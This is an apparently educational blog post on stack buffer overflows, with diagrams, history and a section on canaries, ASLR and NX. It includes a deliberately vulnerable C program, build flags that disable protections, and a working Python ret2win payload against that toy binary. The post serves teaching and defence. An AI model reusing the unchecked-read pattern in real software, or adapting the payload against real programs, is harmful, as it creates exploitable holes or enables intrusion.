---
title: "Smashing the Stack: A Visual Guide to Buffer Overflows"
description: "How an unchecked write overwrites a saved return address, with a working ret2win demo, and why canaries, ASLR, and NX exist."
date: 2026-09-13
authors:
  - "0x4142"
tags:
  - security
  - memory-safety
  - c
  - exploitation
  - ctf
---

<style>
.sb-fig {
  margin-block: 2rem;
}
.sb-fig svg {
  display: block;
  width: 100%;
  height: auto;
  font-family: var(--font-mono);
}
.sb-fig figcaption {
  margin-block-start: 0.6rem;
  font-size: 0.85em;
  color: var(--muted-foreground);
  text-align: center;
}
.sb-box {
  fill: var(--muted);
  stroke: var(--border);
}
.sb-box-hot {
  fill: color-mix(in oklab, var(--destructive) 16%, var(--muted));
  stroke: var(--destructive);
}
.sb-sub {
  fill: var(--muted-foreground);
}
</style>

In 1996, someone writing as Aleph One published [*Smashing the Stack for Fun and
Profit*](https://phrack.org/issues/49/14.html) in Phrack 49. Three decades
later it's still the paper most security courses hand you first, because the
bug it describes hasn't gone away. It's just gotten harder to pull off
thanks to the mitigations we'll get to at the end. Understanding *why* those
mitigations exist means understanding what a function call actually does to
memory, which is hard to hold in your head without a picture. So this post
has a lot of pictures.

## Why a decades-old bug still matters

A stack buffer overflow happens when a program writes more data into a
fixed-size local buffer than that buffer can hold, and the extra bytes spill
into adjacent memory instead of being rejected. In a memory-unsafe language
like C or C++, nothing stops that write. The consequences range from "the
program crashes" to "an attacker who controls the input now controls where
the program jumps next", which is another way of saying *arbitrary code
execution*. It's tracked today as [CWE-121](https://cwe.mitre.org/data/definitions/121.html),
and it's the same root cause behind the 1988 Morris worm, decades of CVEs in
C-language servers and parsers, and no small number of "critical" security
advisories still being filed for embedded and legacy code.

:::important[Scope of this post]
This is a conceptual walkthrough of *how the bug works and why it's
dangerous*: the same material any intro security course covers. Further
down there's a working demo, but it only redirects execution to a function
that's already compiled into a program you build yourself: no shellcode, no
injected code, and nothing aimed at software you don't own. Run it in a
disposable VM or container, never anywhere that matters.
:::

## How memory is laid out under your program

Every running process gets its own virtual address space. The part that
matters here is that the **stack** and the **heap** grow toward each other
from opposite ends of that space:

<figure class="sb-fig">
<svg viewBox="0 0 320 400" role="img" aria-labelledby="sb-d1-title sb-d1-desc">
<title id="sb-d1-title">Layout of a process's virtual address space</title>
<desc id="sb-d1-desc">A column of memory segments from high to low addresses: argv and environment, then the stack growing downward, an unmapped gap, the heap growing upward, then the BSS, data, and text segments at the bottom.</desc>
  <text x="10" y="16" class="sb-sub" font-size="11">higher addresses</text>

  <rect class="sb-box" x="60" y="24" width="200" height="44"/>
  <text x="160" y="42" text-anchor="middle" font-size="12" fill="var(--foreground)">argv / envp</text>
  <text x="160" y="58" text-anchor="middle" font-size="10" class="sb-sub">command-line args, environment</text>

  <rect class="sb-box" x="60" y="78" width="200" height="56"/>
  <text x="160" y="100" text-anchor="middle" font-size="13" fill="var(--foreground)">stack</text>
  <text x="160" y="118" text-anchor="middle" font-size="10" class="sb-sub">grows toward lower addresses ↓</text>

  <rect x="60" y="142" width="200" height="50" fill="none" stroke="var(--border)" stroke-dasharray="4 3"/>
  <text x="160" y="171" text-anchor="middle" font-size="10" class="sb-sub">unmapped gap</text>

  <rect class="sb-box" x="60" y="200" width="200" height="56"/>
  <text x="160" y="222" text-anchor="middle" font-size="13" fill="var(--foreground)">heap</text>
  <text x="160" y="240" text-anchor="middle" font-size="10" class="sb-sub">grows toward higher addresses ↑</text>

  <rect class="sb-box" x="60" y="264" width="200" height="38"/>
  <text x="160" y="288" text-anchor="middle" font-size="12" fill="var(--foreground)">bss (uninitialized globals)</text>

  <rect class="sb-box" x="60" y="308" width="200" height="38"/>
  <text x="160" y="332" text-anchor="middle" font-size="12" fill="var(--foreground)">data (initialized globals)</text>

  <rect class="sb-box" x="60" y="352" width="200" height="38"/>
  <text x="160" y="376" text-anchor="middle" font-size="12" fill="var(--foreground)">text (program code)</text>
</svg>
<figcaption>Fig. 1: A process's address space. The stack and heap grow toward each other so both can expand without a fixed size limit.</figcaption>
</figure>

Every time a function is called, a new **stack frame** is pushed onto the
stack: room for its local variables, its saved bookkeeping, and the address
execution should return to when it's done. That frame is where our bug
lives.

## Anatomy of a stack frame

Take this function:

```c
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);   // no bounds check, copies until it hits '\0'
    printf("You said: %s\n", buf);
}
```

When `vulnerable` is called, its frame looks like this (this is the classic
x86 layout the original paper uses; the same idea holds on other
architectures, just with different register names):

<figure class="sb-fig">
<svg viewBox="0 0 380 300" role="img" aria-labelledby="sb-d2-title sb-d2-desc">
<title id="sb-d2-title">A stack frame before the overflow</title>
<desc id="sb-d2-desc">From high to low addresses: the caller's frame, the return address, the saved base pointer, and a 64-byte local buffer at the bottom, where the stack pointer sits.</desc>
  <text x="12" y="16" class="sb-sub" font-size="11">higher addresses</text>

  <rect class="sb-box" x="70" y="24" width="240" height="34"/>
  <text x="190" y="45" text-anchor="middle" font-size="11" class="sb-sub">caller's frame (arguments, …)</text>

  <rect class="sb-box" x="70" y="66" width="240" height="40"/>
  <text x="190" y="90" text-anchor="middle" font-size="12" fill="var(--foreground)">return address</text>

  <rect class="sb-box" x="70" y="114" width="240" height="40"/>
  <text x="190" y="138" text-anchor="middle" font-size="12" fill="var(--foreground)">saved base pointer</text>

  <rect class="sb-box" x="70" y="162" width="240" height="100"/>
  <text x="190" y="198" text-anchor="middle" font-size="13" fill="var(--foreground)">buf[64]</text>
  <text x="190" y="216" text-anchor="middle" font-size="10" class="sb-sub">local buffer</text>
  <text x="190" y="248" text-anchor="middle" font-size="11" fill="var(--foreground)">strcpy writes upward ↑</text>

  <text x="70" y="282" font-size="11" class="sb-sub">← stack pointer (top of stack)</text>
  <text x="12" y="292" class="sb-sub" font-size="11">lower addresses</text>
</svg>
<figcaption>Fig. 2: <code>buf</code> sits at the bottom of the frame, at lower addresses than the saved base pointer and the return address above it.</figcaption>
</figure>

The detail that makes the whole bug possible: `buf` occupies the *lowest*
addresses in the frame, and `strcpy` writes forward, toward *higher*
addresses. So a write that runs past the end of `buf` doesn't wrap around or
crash immediately. It keeps going, straight into the saved base pointer, and
then into the return address sitting right above it.

## What an overflow actually overwrites

Call `vulnerable("AAAA...AAAA")` with more than 64 `'A'` bytes (`0x41` each),
and here's the same frame afterward:

<figure class="sb-fig">
<svg viewBox="0 0 420 356" role="img" aria-labelledby="sb-d3-title sb-d3-desc">
<title id="sb-d3-title">The same stack frame after a buffer overflow</title>
<desc id="sb-d3-desc">The 64-byte buffer has been filled past its end with repeating 0x41 bytes, overwriting the saved base pointer and the return address, which now points to attacker-controlled memory instead of back into the caller.</desc>
  <rect class="sb-box-hot" x="70" y="24" width="240" height="40"/>
  <text x="190" y="42" text-anchor="middle" font-size="12" fill="var(--foreground)">return address</text>
  <text x="190" y="58" text-anchor="middle" font-size="11" fill="var(--destructive)">0x41414141</text>

  <rect class="sb-box-hot" x="70" y="72" width="240" height="40"/>
  <text x="190" y="96" text-anchor="middle" font-size="12" fill="var(--foreground)">saved base pointer → 0x41414141</text>

  <rect class="sb-box-hot" x="70" y="120" width="240" height="96"/>
  <text x="190" y="150" text-anchor="middle" font-size="12" fill="var(--foreground)">41 41 41 41 41 41 41 41 …</text>
  <text x="190" y="168" text-anchor="middle" font-size="10" class="sb-sub">buf[64], fully overwritten</text>
  <text x="190" y="196" text-anchor="middle" font-size="11" fill="var(--foreground)">write continues past the end ↑</text>

  <text x="70" y="234" font-size="11" class="sb-sub">← stack pointer</text>

  <path d="M310 44 C 375 44, 375 290, 240 296" fill="none" stroke="var(--destructive)" stroke-width="1.5" stroke-dasharray="3 3"/>
  <rect x="60" y="296" width="340" height="46" fill="none" stroke="var(--destructive)"/>
  <text x="230" y="314" text-anchor="middle" font-size="11" fill="var(--destructive)">on return: jumps to 0x41414141</text>
  <text x="230" y="330" text-anchor="middle" font-size="11" fill="var(--destructive)">instead of the caller</text>
</svg>
<figcaption>Fig. 3: Every byte past the 64th overwrites the next thing in memory. Here that's the saved base pointer, then the return address itself.</figcaption>
</figure>

In this toy example the overflow just crashes: `0x41414141` almost
certainly isn't mapped memory. But the attacker doesn't have to send `'A'`
characters. They control every byte of the input, which means they control
exactly what value lands in that return-address slot. The two classic
choices from the original paper are:

- **Point it at injected code.** Fill part of the buffer with actual machine
  instructions and aim the return address at them, so the CPU starts
  executing attacker-supplied bytes the moment the function returns.
- **Point it at code that already exists.** Modern defenses make the first
  option hard (more below), so real-world exploits increasingly reuse
  existing code in the binary or its libraries instead, chaining together
  legitimate instructions to do something the program was never meant to do.

Either way, the core move is the same: **a write bug becomes a
control-flow hijack**, because on this architecture the thing that decides
"what runs next" and the thing holding "user data" live in the same
writable memory, one right after the other.

## A hands-on simulation: hijacking control flow yourself

Theory is one thing. Here's a minimal, deliberately vulnerable program you
can compile and attack yourself, plus the exact payload that does it. It
redirects execution to a function that's already compiled into the binary
rather than injecting new code, which is both simpler to build and closer
to how real exploits work today now that NX makes injected shellcode hard
to run.

:::important[Run this in a disposable VM or container you don't care about]
This deliberately switches off protections a real toolchain enables by
default. Never disable these on a machine, account, or service that
matters. Compile and run this only in a throwaway VM or container, against
this exact code.
:::

### The target

```c
// vuln.c
#include <stdio.h>
#include <unistd.h>

void win(void) {
    puts("\n🚩 win() ran: control flow was hijacked via the return address.");
}

void vulnerable(void) {
    char buf[64];
    read(0, buf, 200);              // reads up to 200 bytes into 64, no bounds check
    printf("You said: %.64s\n", buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);   // don't lose buffered output when we crash
    vulnerable();
    puts("vulnerable() returned normally.");
    return 0;
}
```

`win()` is never called anywhere in this program. The only way it runs is if
something hijacks control flow into it, which is exactly what the payload
below does.

### Building it with the safety rails off

```bash
gcc -fno-stack-protector -no-pie -O0 -o vuln vuln.c
```

- `-fno-stack-protector` removes the canary from Fig. 5, so the overwrite
  isn't caught before it's used.
- `-no-pie` gives the binary a fixed, predictable load address, so `win()`
  lands at the same address every run. A real attack without an accompanying
  info leak has to defeat [ASLR](#address-space-layout-randomization-aslr)
  to get this for free.
- NX doesn't need to be touched: this payload never injects new code, only
  redirects execution to code that's already there.

### Finding the offset

Exactly how many padding bytes it takes to reach the return address depends
on your compiler and its version. Don't assume it's simply `64 + 8`. Find
it for your own build with a debugger and a long, distinctive input rather
than guessing:

```bash
gdb ./vuln
(gdb) run <<< $(python3 -c 'print("A"*100)')
# Program received signal SIGSEGV ...
(gdb) print $rsp
# use the crash address, or a cyclic/de Bruijn pattern instead of plain
# 'A's, to compute the exact offset for your build
```

For this post's build, the offset came out to **72 bytes**: 64 for `buf`
plus 8 for the saved base pointer sitting right above it.

### Finding win()'s address

```bash
objdump -d vuln | grep -A1 '<win>:'
# 0000000000401196 <win>:
#   401196: 55    push %rbp
```

### The payload

```python
#!/usr/bin/env python3
# payload.py
import struct, sys

OFFSET   = 72                    # from the offset-finding step above
WIN_ADDR = 0x0000000000401196    # from `objdump -d vuln`, on your own build

payload = b"A" * OFFSET + struct.pack("<Q", WIN_ADDR)
sys.stdout.buffer.write(payload)
```

72 bytes of padding to fill `buf` and the saved base pointer, followed by
`win()`'s address packed little-endian, the same return-address slot from
Fig. 3, aimed somewhere specific instead of at `0x41414141`:

<figure class="sb-fig">
<svg viewBox="0 0 420 320" role="img" aria-labelledby="sb-d4-title sb-d4-desc">
<title id="sb-d4-title">The demo payload overwriting the return address with win()'s address</title>
<desc id="sb-d4-desc">Seventy-two bytes of padding fill the buffer and the saved base pointer, and the final eight bytes of the payload overwrite the return address with the address of the win function, so the CPU jumps there instead of back into main.</desc>
  <rect class="sb-box-hot" x="70" y="24" width="240" height="40"/>
  <text x="190" y="42" text-anchor="middle" font-size="12" fill="var(--foreground)">return address</text>
  <text x="190" y="58" text-anchor="middle" font-size="11" fill="var(--destructive)">→ address of win()</text>

  <rect class="sb-box-hot" x="70" y="72" width="240" height="34"/>
  <text x="190" y="93" text-anchor="middle" font-size="11" fill="var(--foreground)">saved base pointer ← padding</text>

  <rect class="sb-box-hot" x="70" y="114" width="240" height="90"/>
  <text x="190" y="148" text-anchor="middle" font-size="12" fill="var(--foreground)">64 bytes of 'A' padding</text>
  <text x="190" y="166" text-anchor="middle" font-size="10" class="sb-sub">buf[64], bytes 0-63 of the payload</text>
  <text x="190" y="188" text-anchor="middle" font-size="10" class="sb-sub">8 more padding bytes reach the saved rbp</text>

  <text x="70" y="220" font-size="11" class="sb-sub">← stack pointer</text>

  <path d="M310 44 C 375 44, 375 260, 260 282" fill="none" stroke="var(--destructive)" stroke-width="1.5" stroke-dasharray="3 3"/>
  <rect x="60" y="278" width="340" height="34" fill="none" stroke="var(--destructive)"/>
  <text x="230" y="300" text-anchor="middle" font-size="11" fill="var(--destructive)">win() runs instead of returning to main()</text>
</svg>
<figcaption>Fig. 4: The demo payload: 72 bytes of padding filling <code>buf</code> and the saved base pointer, followed by the 8-byte address of <code>win()</code>, little-endian.</figcaption>
</figure>

### Running it

```console
$ ./vuln
hello
You said: hello
vulnerable() returned normally.

$ python3 payload.py | ./vuln
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

🚩 win() ran: control flow was hijacked via the return address.
Segmentation fault (core dumped)
```

The segfault right after `win()` runs is expected, not a mistake in the
payload: this only overwrote *one* return address. When `win()` itself
tries to return, it pops whatever happens to sit above it on the stack next,
and there was never a valid address planted there. That's the whole demo:
one unbounded write, 72 bytes of predictable padding, and 8 bytes of address
turned "return to caller" into "run this arbitrary function instead."

:::note[What this demo deliberately doesn't show]
No shellcode, no NOP sled, no bypassing a canary or ASLR. Those are
separate, harder problems layered on top of this same core bug, which is
exactly why the mitigations in the next section exist. This demo isolates
the one idea worth internalizing: **when a return address lives in the same
writable memory as unchecked user input, whoever controls the input controls
where execution goes next.**
:::

## Why this is a serious risk

### It doesn't take much

The vulnerable function above is four lines long, uses a completely
ordinary standard-library call, and would have compiled without a single
warning on most toolchains for decades. Bugs of this shape have historically
hidden in format parsers, protocol decoders, header handlers: anywhere a
length is read from untrusted input and trusted a little too much.

### Real-world impact

- The **Morris worm** (1988), one of the first self-propagating internet
  worms, exploited a stack buffer overflow in `fingerd`.
- Buffer overflows are consistently one of the most reported vulnerability
  classes in the [CWE Top 25](https://cwe.mitre.org/top25/) most dangerous
  software weaknesses, decades after they were first documented.
- Because they can lead directly to remote code execution, they're
  routinely rated **critical severity**: a single unchecked copy in
  network-facing code can be enough to fully compromise a host.

## How modern systems defend against it

The reason this specific example won't just work if you copy-paste it today
is that mainstream toolchains and OSes now stack several independent
mitigations on top of each other.

### Stack canaries

The compiler places a random value, the **canary**, between local buffers
and the saved base pointer, and inserts a check right before the function
returns.

<figure class="sb-fig">
<svg viewBox="0 0 480 340" role="img" aria-labelledby="sb-d5-title sb-d5-desc">
<title id="sb-d5-title">A stack frame protected by a stack canary</title>
<desc id="sb-d5-desc">A random canary value sits between the buffer and the saved base pointer. An overflow must corrupt the canary before it can reach the return address, and the function checks the canary just before returning, aborting the program if it has changed.</desc>
  <rect class="sb-box" x="70" y="20" width="240" height="34"/>
  <text x="190" y="41" text-anchor="middle" font-size="11" fill="var(--foreground)">return address</text>

  <rect class="sb-box" x="70" y="58" width="240" height="34"/>
  <text x="190" y="79" text-anchor="middle" font-size="11" fill="var(--foreground)">saved base pointer</text>

  <rect x="70" y="96" width="240" height="34" fill="color-mix(in oklab, var(--destructive) 12%, var(--muted))" stroke="var(--destructive)"/>
  <text x="190" y="117" text-anchor="middle" font-size="11" fill="var(--foreground)">canary (random, checked on return)</text>

  <rect class="sb-box" x="70" y="134" width="240" height="86"/>
  <text x="190" y="178" text-anchor="middle" font-size="13" fill="var(--foreground)">buf[64]</text>
  <text x="190" y="196" text-anchor="middle" font-size="10" class="sb-sub">overflow must pass through the canary first</text>

  <line x1="190" y1="220" x2="190" y2="248" stroke="var(--muted-foreground)"/>
  <text x="190" y="264" text-anchor="middle" font-size="11" class="sb-sub">before returning…</text>

  <path d="M190 272 L 110 296" fill="none" stroke="var(--muted-foreground)"/>
  <path d="M190 272 L 300 296" fill="none" stroke="var(--muted-foreground)"/>

  <text x="35" y="312" font-size="11" fill="var(--foreground)">canary unchanged</text>
  <text x="35" y="328" font-size="12" fill="var(--foreground)">→ ret proceeds normally</text>

  <text x="255" y="312" font-size="11" fill="var(--destructive)">canary corrupted</text>
  <text x="255" y="328" font-size="11" fill="var(--destructive)">→ abort: stack smashing detected</text>
</svg>
<figcaption>Fig. 5: The canary sits between the buffer and the saved data it protects. A linear overflow has to overwrite it first, and a changed canary aborts the program before the corrupted return address is ever used.</figcaption>
</figure>

This is why the toy example needs `-fno-stack-protector` to behave the way
the diagrams describe: GCC and Clang have enabled canaries by default since
the mid-2000s.

### Address space layout randomization (ASLR)

The OS randomizes where the stack, heap, and shared libraries are loaded on
every run. Even if an attacker corrupts a return address, reliably guessing
*where* their injected code or reusable gadgets actually live in memory
becomes much harder.

### Non-executable stack (NX / DEP)

Memory pages holding the stack are marked non-executable at the hardware
level, so even a return address that does point at injected shellcode can't
run it: the CPU refuses to execute instructions fetched from that page.
This is what pushed attackers toward reusing existing executable code
instead of injecting new code.

### Safer languages and tooling

The most durable fix is structural rather than reactive: languages like
Rust and Go make this entire bug class largely unrepresentable by enforcing
bounds-checked memory access at compile time or runtime. Where C and C++
remain, fuzzing (e.g. libFuzzer, AFL) and sanitizers (AddressSanitizer) catch
overflows like this one long before they ship.

:::note
No single mitigation here is bulletproof on its own: canaries, ASLR, and
NX are typically deployed together specifically because bypassing all
three at once is a much taller order than bypassing any one of them alone.
:::

## Key takeaways

- A stack buffer overflow happens when a write to a fixed-size local buffer
  isn't bounds-checked, and the extra bytes spill into adjacent stack memory.
- Because local buffers sit at lower addresses than the saved base pointer
  and return address, an overflow that writes far enough overwrites exactly
  the data that controls where the program executes next.
- That's what turns a memory-safety bug into a control-flow hijack, and
  potentially into remote code execution.
- Stack canaries, ASLR, and non-executable stack pages each close off part
  of the attack independently; modern toolchains enable all three by
  default for exactly that reason.
- The most reliable long-term fix is avoiding the bug class entirely, via
  memory-safe languages and rigorous fuzzing/sanitization of C/C++ code
  that can't yet be replaced.

## Further reading

- Aleph One, [*Smashing the Stack for Fun and Profit*](https://phrack.org/issues/49/14.html), Phrack 49 (1996): the original paper this post is a modern, visual companion to.
- MITRE, [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html)
- MITRE/CISA, [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings): a community-maintained collection of payloads and bypasses across many attack types and languages, useful once you're ready to look past this one bug class.
